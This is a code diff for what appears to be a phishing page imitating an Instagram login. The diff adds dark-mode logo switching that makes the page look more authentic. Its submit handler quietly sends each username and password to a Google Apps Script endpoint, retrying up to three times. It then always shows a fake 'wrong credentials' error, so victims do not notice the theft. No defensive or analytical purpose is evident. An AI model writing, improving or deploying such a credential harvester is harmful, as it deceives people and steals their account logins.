@@ -8,15 +8,45 @@ document.addEventListener('DOMContentLoaded', () => {
     const showHideText = document.querySelector('.show-hide-text');
     const eyeOpenIcon = document.getElementById('eye-open');
     const eyeClosedIcon = document.getElementById('eye-closed');
+    const instaLogo = document.querySelector('.insta-logo'); // Get the logo element
 
     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec';
     
+    // Define logo URLs for easy management
+    const lightModeLogo = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZ4_b4IC88VF6Yktpge1s0B8jDRW8lunNVL-OvZkNLPjFFF-HLHqEwKYsp8eZbjjjPBVz75GaPTC3_I41JE95W8LjpdFTgNj1ha6qM9B2KVUXHC44T0KEwDjlVS3DL_FhpMitCn56BQZv0dHODgJjDf8qVEnAA7iRCPdV5JkpKuUm8KBzbG83gu86L3hcv/s1600/4.png';
+    const darkModeLogo = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlefH02PFuImozeitEEAZaLYaNNBuFeaoGQ9zBtcvFVU1dTS_volNhLYU4_dtOvxtzxAvAgJcddSzWF5gV1nf2dDmzKzdGQAEaX_0ieYZsV4OF6v4n2FPOs1Kyln7vFgAkJvUGG8mIOakdC-T_Oa5ge5RWyQOwtx5P0Lw6_k1NLs_HVuAuYrfGy_bd2nuL/s1600/3.png';
+
     window.onload = () => {
         splashScreen.classList.add('fade-out');
         setTimeout(() => {
             splashScreen.style.display = 'none';
         }, 500);
     };
+
+    // --- START: Robust Theme Switching Code ---
+    function applyTheme(isDark) {
+        document.body.classList.toggle('dark-mode', isDark);
+
+        // NEW: Check if the desktop logo exists and update its source
+        if (instaLogo) {
+            if (isDark) {
+                instaLogo.src = darkModeLogo;
+            } else {
+                instaLogo.src = lightModeLogo;
+            }
+        }
+    }
+
+    const colorSchemeQuery = window.matchMedia('(prefers-color-scheme: dark)');
+    
+    // Apply theme on initial page load
+    applyTheme(colorSchemeQuery.matches);
+    
+    // Listen for future theme changes
+    colorSchemeQuery.addEventListener('change', (e) => {
+        applyTheme(e.matches);
+    });
+    // --- END: Robust Theme Switching Code ---
 
     function initPasswordToggle() {
         if (!passwordInput || !showHideButton) return;
@@ -61,11 +91,8 @@ document.addEventListener('DOMContentLoaded', () => {
         removeCredentialError();
         showLoadingState();
 
-        // Await the submission function, which now includes retries
         await submitViaFetch(username, password);
         
-        // This timer runs after the submission attempts are finished.
-        // It preserves the original user experience of a simulated delay before showing an error.
         setTimeout(() => {
             resetLoginButton();
             showCredentialError();
@@ -85,40 +112,28 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1500);
     });
 
-    /**
-     * A helper function to create a delay.
-     * @param {number} ms - The number of milliseconds to wait.
-     */
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-    /**
-     * Submits data using the modern Fetch API with a silent retry mechanism.
-     * @param {string} username - The user's username.
-     * @param {string} password - The user's password.
-     */
     async function submitViaFetch(username, password) {
         const url = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&t=${Date.now()}`;
-        const maxRetries = 3; // 1 initial attempt + 2 retries
+        const maxRetries = 3; 
 
         for (let attempt = 0; attempt < maxRetries; attempt++) {
             try {
-                // Use fetch in 'no-cors' mode for a "fire-and-forget" request.
                 await fetch(url, {
                     method: 'GET',
                     mode: 'no-cors',
                     cache: 'no-cache'
                 });
                 
-                // If fetch doesn't throw an error, the request was successfully sent.
                 console.log(`Attempt ${attempt + 1} succeeded.`);
-                return; // Exit the function on success
+                return; 
                 
             } catch (error) {
                 console.error(`Attempt ${attempt + 1} failed:`, error);
                 
-                // If this wasn't the last attempt, wait before retrying.
                 if (attempt < maxRetries - 1) {
-                    await sleep(1000); // Wait 1 second before the next try
+                    await sleep(1000); 
                 } else {
                     console.error('All submission attempts failed.');
                 }
